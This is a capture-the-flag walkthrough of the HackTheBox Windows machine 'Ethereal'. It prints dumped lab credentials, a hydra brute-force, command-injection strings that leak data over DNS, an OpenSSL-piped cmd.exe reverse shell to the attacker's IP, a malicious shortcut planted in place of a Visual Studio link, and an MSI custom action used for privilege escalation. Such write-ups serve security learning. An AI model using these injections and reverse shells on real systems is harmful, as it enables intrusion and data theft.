---
layout: single
classes: wide
title:  "Walkthrough - Ethereal"
date: 2019-03-23
categories:
    - "hackthebox"
tags:
    - machines
    - insane
    - windows
---

This machine was absolutely insane, mind boggling and fun at the same time. It took me a lot of painful days to own this machine but eventually, hard work wins. It was definitely not easy to enumerate mainly due to the slow speed and also the way things had to be located. Nonetheless, an awesome machine for learning.

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/banner.png)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```bash
# Nmap 7.70 scan initiated Sat Mar 23 11:04:51 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.106
Nmap scan report for 10.10.10.106
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Well, so we have a few ports open, port 21, 80 and 8080.

## FTP

I always like to check the low-hanging fruit first. So let's get into FTP since `anonymous` login is allowed. This is a common misconfiguration for FTP logins. You never know what you might find but always is useful.

```bash
pswapnil@noone:~/Ethereal$ ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:pswapnil): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-10-18  09:03PM       <DIR>          binaries
09-02-09  08:58AM                 4122 CHIPSET.txt
01-12-03  08:58AM              1173879 DISK1.zip
01-22-11  08:58AM               182396 edb143en.exe
01-18-11  11:05AM                98302 FDISK.zip
07-10-18  08:59PM       <DIR>          New folder
07-10-18  09:38PM       <DIR>          New folder (2)
07-09-18  09:23PM       <DIR>          subversion-1.10.0
11-12-16  08:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.
```

I created a copy of the FTP data on my local drive. Found a zip file `FDISK.zip`, unzipped it and mounted it as a drive.

```bash
pswapnil@noone:~/Ethereal/ftp-data$ mount FDISK fdisk
pswapnil@noone:~/Ethereal/ftp-data$ ls -la fdisk/pbox
total 88
drwxr-xr-x 2 root root   512 Jul  2  2018 .
drwxr-xr-x 3 root root  7168 Dec 31  1969 ..
-rwxr-xr-x 1 root root   284 Jul  2  2018 pbox.dat
-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exe
```

`pbox`?! What's that? A little Google-Fu and I found that it's a password box or a dos-based password manager.
So, I used this [software](https://sourceforge.net/projects/passwbox/files/latest/download) to try and load the data from the `.dat` file.

I copied the `pbox.dat` file I found in the FTP session to my home directory as `.pbox.dat`. After executing the pbox client we just downloaded for Linux, it prompted me for the password.

```bash
swapnil@swapnil:/home/swapnil/Downloads $ ./pbox                 
Enter your master password: password
```

I guessed the password trying out `admin`, `pbox`, etc, got it right for `password`. It opened the following screen.

![pbox]({{ site.url }}{{ site.baseurl }}/assets/HTB_images/machines/ethereal/pbox.png)

Using the `--dump` option, I was able to dump all the usernames and passwords and store them locally.

```bash
swapnil@swapnil:/home/swapnil/Downloads $ ./pbox --dump
Enter your master password: ********
databases  ->  7oth3B@tC4v3!
msdn  ->  alan@ethereal.co / P@ssword1!
learning  ->  alan2 / learn1ng!
ftp drop  ->  Watch3r
backup  ->  alan / Ex3cutiv3Backups
website uploads  ->  R3lea5eR3@dy#
truecrypt  ->  Password8
management server  ->  !C414m17y57r1k3s4g41n!
svn  ->  alan53 / Ch3ck1ToU7>
```

That was it from FTP. I believe, the tedious process to just be able to obtain a dump is evidence that this box isn't an wasy one.

## HTTP

In the web browser, we get the following window as a welcome page.

![ethereal]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-80.png)

Moving around, I found a menu item called `Admin`, let's go there.

![ethereal-admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-admin.png)

Many menu items here as well. The only important one was `Ping`. Clicking on it redirected me to `ethereal.htb:8080` and gave me the following page.

![ethereal-8080]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-8080.png)

Time to add `ethereal.htb` to the `hosts` file. Also, the `Notes` menu took me to a page where it mentioned the name `Alan`, ring a bell? It's the same name that appeared in the `pbox` dump.

![ethereal-notes]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/admin-notes.png)

After the `hosts` file is updated, clicking the `Ping` option again got me an HTTP authentication page.

![ethereal-httpauth]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/httpauth-8080.png)

Fortunately, we have a list of usernames and passwords from the dump that we obtained earlier. Use that to brute-force the HTTP authentication.

```bash
root@kali# hydra -L usernames -P passwords -s 8080 -f ethereal.htb http-get /
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:4/p:9), ~3 tries per task
[DATA] attacking http-get://ethereal.htb:8080/
[8080][http-get] host: ethereal.htb   login: alan   password: !C414m17y57r1k3s4g41n!
1 of 1 target successfully completed, 1 valid password found
```

There's the login. Using that, we find this page.

![admin-console]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/admin-console.png)

I put my IP address in the text-field and it showed `Connection to host successful`. Let's try to capture packets this time around using `tcpdump`.

```bash
root@kali:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:57:58.345968 IP ethereal.htb > kali: ICMP echo request, id 1, seq 235, length 40
12:57:58.345989 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 235, length 40
12:57:59.616726 IP ethereal.htb > kali: ICMP echo request, id 1, seq 236, length 40
12:57:59.616884 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 236, length 40
```

We get 2 pings! Looks weird. Based on a guess, it's running something like `ping -n2 <ip>`. Let's find out if this box allows DNS queries. I'll use `& nslookup abcde <myip>` in the text field. Try to see it using tcpdump.

```bash
pswapnil@noone:~/Ethereal$ tcpdump -ni tun0 udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:49:18.150063 IP 10.10.10.106.50772 > 10.10.16.39.53: 3+ AAAA? abcde. (23)
```

Great! So we can get data from DNS.

## Enumeration using injection

During my **really** slow enumeration, I found a world writable directory and used `& netsh advfirewall firewall show rule name=all dir=out verbose > c:\users\public\desktop\shortcuts\firewall_rules.txt` to list all the firewall rules in the .txt file.
Using `& for /f "eol=- skip=100 tokens=1-10*" %i in (c:\users\public\desktop\shortcuts\firewall_rules.txt) do nslookup %i_%j_%k_%l_%m_%o_%p_%q <my ip>`, I got the data in my terminal.

I found that the following rules had been set.

```console
Rule Name: Allow TCP Ports 136
Enabled: Yes
Direction: Out
Profiles: Domain,Private,Public
Grouping:
LocalIP: Any
RemoteIP: Any
Protocol: TCP
LocalPort: Any
RemotePort: 73,136      
Edge traversal: No     
InterfaceTypes: Any      
Security: NotRequired      
Rule source: Local Setting    
Action: Allow  
```

Also, I located a OpenSSL binary in the `C:` drive. Using `& for /f "usebackq tokens=*" %i in (`dir /b c:\progra~2\openss~1.0\bin\`) do nslookup %i <ip>`, I listed the contents on the folder and found a `openssl.exe` file.

## Shell using OpenSSL

Let's test whether we can connect to a server using this openssl binary.
I created key and certificate for our server.

```bash
pswapnil@noone:~$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
Generating a RSA private key
....+++++
................................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
pswapnil@noone:~$ ls *.pem
cert.pem  key.pem
```

I ran a OpenSSL server using `openssl s_server -quiet -key key.pem -cert cert.pem  -port 73` and I used `& quiet ( echo "abcde" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect <ip>:73 )` to test the connection.

```bash
pswapnil@noone:~$ sudo openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
"abcde"
```

Great! We can send data over using OpenSSL. Now, in order to get a shell, we need to set up two SSL servers running on my machine and use `& c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect <ip>:73 | cmd.exe /k /q | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect <ip>:136` to get a shell.
I already have a server running on port 73 now we will start one on port 136 and put the command above into the browser.

```bash
root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

And we have a shell! Let's hunt for the `user.txt` file.

```bash
c:\windows\system32\inetsrv>whoami
ethereal\alan
```

I could not find a user.txt file on alan's desktop but found a `note-draft.txt` file.

```bash
c:\Users\alan\Desktop>type note-draft.txt
I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.

- Alan
```

Shortcut on a public desktop? Let's find out.

```bash
c:\Users\Public\Desktop\Shortcuts>dir
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\Users\Public\Desktop\Shortcuts

07/17/2018  08:15 PM    <DIR>          .
07/17/2018  08:15 PM    <DIR>          ..
07/06/2018  02:28 PM             6,125 Visual Studio 2017.lnk
               1 File(s)          6,125 bytes
               2 Dir(s)  15,427,989,504 bytes free
```

I generated a `.lnk` file using [LNKUp](https://github.com/Plazmaz/LNKUp) using `python generate.py --host localhost --type ntlm --output payload.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect <myip>:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect <myip>:136"`

Once we have the `.lnk` file, we can create a `base64` of it and copy it to the system using `openssl base64 -A -e -in payload.lnk -out payload`.

Now let's copy the string to the windows machine. To do that we could use `echo | set /p="TAAA...Y28AAAAA" > c:/users/public/desktop/shortcuts/b64file.txt`, now let's replace the *Visual Studio 2017.lnk* file. I will use `cd c:\users\public\desktop\shortcuts && c:\progra~2\openssl-v1.1.0\bin\openssl base64 -A -d -in b64file.txt -out "Visual Studio 2017.lnk"`

I restarted the OpenSSL shells on port 73 and 136 and within a few seconds, I see this...

```bash
root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\jorge\Documents>whoami
ethereal\jorge

C:\Users\jorge\Documents>type c:\users\jorge\desktop\user.txt
2******************************d
```

Awesome! Feel's good after doing so much, finally we have the `user.txt` file. But its not over yet.

## Privilege escalation

I found two drives mounted on the system, `C:` and `D:`, I found the following information from the `D:` drive.

```bash
D:\Certs>dir
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\Certs

07/07/2018  09:50 PM    <DIR>          .
07/07/2018  09:50 PM    <DIR>          ..
07/01/2018  09:26 PM               772 MyCA.cer
07/01/2018  09:26 PM             1,196 MyCA.pvk
               2 File(s)          1,968 bytes
               2 Dir(s)   8,437,514,240 bytes free

D:\DEV\MSIs>dir
Volume in drive D is Development
Volume Serial Number is 54E5-37D1

Directory of D:\DEV\MSIs

07/08/2018  10:09 PM    <DIR>          .
07/08/2018  10:09 PM    <DIR>          ..
07/18/2018  09:47 PM               133 note.txt
               1 File(s)            133 bytes
               2 Dir(s)   8,437,514,240 bytes free

D:\DEV\MSIs>type note.txt
Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.

- Rupal               
```

Next task, create a `msi` file!?
I used `wix tool` to create the msi.

```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
	<Product Id="*" UpgradeCode="ABCDDCBA-7349-453F-94F6-BCB5110BA4FD" Name="Mal msi" Version="0.0.1" Manufacturer="myorg" Language="1033">
	<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
	<Media Id="1" Cabinet="malmsi.cab" EmbedCab="yes"/>
	<Directory Id="TARGETDIR" Name="SourceDir">
		<Directory Id="ProgramFilesFolder">
			<Directory Id="INSTALLLOCATION" Name="malmsi">
				<Component Id="malmsi" Guid="ABCDDCBA-83F1-4F22-985B-FDB3C8ABD471">
					<File Id="malmsi" Source="malmsi.exe"/>
				</Component>
			</Directory>
		</Directory>
	</Directory>
	<Feature Id="DefaultFeature" Level="1">
		<ComponentRef Id="foobar"/>
	</Feature>
	<CustomAction Id="Root" Directory="TARGETDIR" ExeCommand="cmd.exe /c type c:\users\rupal\desktop\root.txt > c:\users\public\desktop\shortcuts\success.txt" Execute="deferred" Impersonate="yes" Return="ignore"/>
	<InstallExecuteSequence>
		<Custom Action="Root" After="InstallInitialize"></Custom>
	</InstallExecuteSequence>
	</Product>
</Wix>
```
